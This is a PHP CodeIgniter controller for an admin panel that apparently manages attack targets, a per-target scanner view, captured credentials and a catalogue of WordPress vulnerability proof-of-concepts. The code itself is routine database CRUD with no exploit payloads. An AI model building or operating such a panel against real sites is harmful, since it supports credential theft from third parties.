<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Painel extends CI_Controller
{

    function __construct()
    {

        parent::__construct();
        $this->load->model('tung_model');
        $this->load->model('main_model');
        $this->load->model('poc_model');

    }

    public function index()
    {

       

        redirect(base_url('login'));
    }

    public function login()
    {

        $this->load->view('painel/login');
    }

    public function adp_prospection()
    {
        $this->main_model->checkSession();
        // prospecção dos dp
        $this->load->view('painel/adp_prospection');
    }
    
    
    public function adp_pocs()
    {
        $this->main_model->checkSession();
        // prospecção dos dp
        $this->load->view('painel/adp_pocs');
    }
    

    public function act_get_adepto()
    {
        $this->main_model->checkSession();

        $adp_id  = htmlspecialchars($this->input->post('id'));

        if ($this->tung_model->get_adp($adp_id)) {
            $response = array("status" => "true", "message" => "Atualizado com sucesso.", "response"  => $this->tung_model->get_adp($adp_id));
        } else {
            $response = array("status" => "false", "message" => "Erro ao atualizar.");
        }

        print_r(json_encode($response));
    }


    public function act_get_target()
    {
        $this->main_model->checkSession();

        $target_id  = htmlspecialchars($this->input->post('target_id'));

        if ($this->tung_model->get_target($target_id)) {
            $response = array("status" => "true", "message" => "encontrado com sucesso.", "response"  => $this->tung_model->get_target($target_id));
        } else {
            $response = array("status" => "false", "message" => "Erro ao encontrar.");
        }

        print_r(json_encode($response));
    }


    public function act_update_adp_prospection()
    {
        $this->main_model->checkSession();

        $id  = htmlspecialchars($this->input->post('id'));
        $data['adp_proportion']  = htmlspecialchars($this->input->post('adp_proportion'));
        $data['adp_colligate']  = htmlspecialchars($this->input->post('adp_colligate'));
        $data['adp_active']  = htmlspecialchars($this->input->post('adp_active'));
        $data['adp_helper_code']  = htmlspecialchars($this->input->post('adp_helper_code'));

        $data['adp_id'] =  base64_encode('https://reviewit.com.br/affiliation/?ref=' . $data['adp_helper_code']);



        if ($this->tung_model->update_adp($id, $data)) {
            $response = array("status" => "true", "message" => "Atualizado com sucesso.");
        } else {
            $response = array("status" => "false", "message" => "Erro ao atualizar.");
        }

        print_r(json_encode($response));
    }

    public function act_update_adp_prospection_proportion()
    {
        $this->main_model->checkSession();

        $data['adp_proportion']  = htmlspecialchars($this->input->post('adp_proportion'));

        if ($this->tung_model->update_adp_proportion_all($data)) {
            $response = array("status" => "true", "message" => "Atualizado com sucesso.");
        } else {
            $response = array("status" => "false", "message" => "Erro ao atualizar.");
        }

        print_r(json_encode($response));
    }


    public function test_adp_id()
    {
        $this->main_model->checkSession();

        $adp_id = htmlspecialchars($this->input->get('adp_id'));

        $data = array(
            'adp_id' => $adp_id
        );

        $this->load->view('painel/test_adp_id', $data);
    }

    public function adp_prospection_activity()
    {
        $this->main_model->checkSession();
        // atividades dos dp
        $this->load->view('painel/adp_prospection_activity');
    }

    public function adp_prospection_credentials()
    {
        $this->main_model->checkSession();
        // credenciais capturadas pelos aps
        $this->load->view('painel/adp_prospection_credentials');
    }

    public function adp_prospection_list()
    {
        $this->main_model->checkSession();
        // ADP ALVOS
        $this->load->view('painel/adp_prospection_list');
    }

    public function adp_prospection_list_edit($id)
    {
        $this->main_model->checkSession();

        $alvo_id = htmlspecialchars($id);

        // print_r($this->main_model->getAlvo($alvo_id));

        if ($this->main_model->getAlvo($alvo_id)) {

            $data = array(
                'alvo' => $this->main_model->getAlvo($alvo_id),
            );

            $this->load->view('painel/adp_prospection_list_edit', $data);
        } else {
            redirect(base_url('painel/adp_prospection_list'));
        }

        // ADP ALVOS
    }
    
    public function adp_scanner($id)
    {
        $this->main_model->checkSession();

        $alvo_id = htmlspecialchars($id);

        // print_r($this->main_model->getAlvo($alvo_id));

        if ($this->main_model->getAlvo($alvo_id)) {

            $data = array(
                'alvo' => $this->main_model->getAlvo($alvo_id),
            );
            
            $this->load->view('painel/adp_scanner', $data);
            
        } else {
            redirect(base_url('painel/adp_prospection_list'));
        }

        // ADP ALVOS
    }

    public function sair() {

        $this->session->unset_userdata('session_user');

        redirect(base_url('painel/login'));
    }
    
    // ------------------
    
    public function act_get_poc()
    {
        $this->main_model->checkSession();
        $wp_id  = htmlspecialchars($this->input->post('id'));
    
        if ($this->poc_model->get_wp_poc_by_id($wp_id)) {
            $response = $this->poc_model->get_wp_poc_by_id($wp_id);
        } else {
            $response = array("status" => "false", "message" => "Erro ao adicionar.");
        }

        print_r(json_encode($response));
    }
    
    public function act_add_poc()
    {
        $this->main_model->checkSession();

        $data['wp_slug']  = htmlspecialchars($this->input->post('wp_slug'));
        $data['wp_description']  = htmlspecialchars($this->input->post('wp_description'));
        $data['wp_version']  = htmlspecialchars($this->input->post('wp_version'));
        $data['wp_type']  = htmlspecialchars($this->input->post('wp_type'));
        $data['wp_verified']  = htmlspecialchars($this->input->post('wp_verified'));
        $data['vuln_type']  = htmlspecialchars($this->input->post('vuln_type'));
        $data['is_deleted']  = 0;



        if ($this->poc_model->add_wp_poc( $data)) {
            $response = array("status" => "true", "message" => "Adicionado com sucesso.");
        } else {
            $response = array("status" => "false", "message" => "Erro ao adicionar.");
        }

        print_r(json_encode($response));
    }
    
     public function act_update_poc()
    {
        $this->main_model->checkSession();
        $wp_id  = htmlspecialchars($this->input->post('wp_id'));

        $data['wp_slug']  = htmlspecialchars($this->input->post('wp_slug'));
        $data['wp_description']  = htmlspecialchars($this->input->post('wp_description'));
        $data['wp_version']  = htmlspecialchars($this->input->post('wp_version'));
        $data['wp_type']  = htmlspecialchars($this->input->post('wp_type'));
        $data['wp_verified']  = htmlspecialchars($this->input->post('wp_verified'));
        $data['vuln_type']  = htmlspecialchars($this->input->post('vuln_type'));
        $data['is_deleted']  = 0;



        if ($this->poc_model->update_wp_poc( $wp_id, $data)) {
            $response = array("status" => "true", "message" => "Atualizado com sucesso.");
        } else {
            $response = array("status" => "false", "message" => "Erro ao adicionar.");
        }

        print_r(json_encode($response));
    }
    
      public function act_delete_poc()
    {
        $this->main_model->checkSession();
        
        $wp_id  = htmlspecialchars($this->input->post('id'));


        if ($this->poc_model->delete_wp_poc( $wp_id)) {
            $response = array("status" => "true", "message" => "Excluido com sucesso.");
        } else {
            $response = array("status" => "false", "message" => "Erro ao Excluir.");
        }

        print_r(json_encode($response));
    }
}
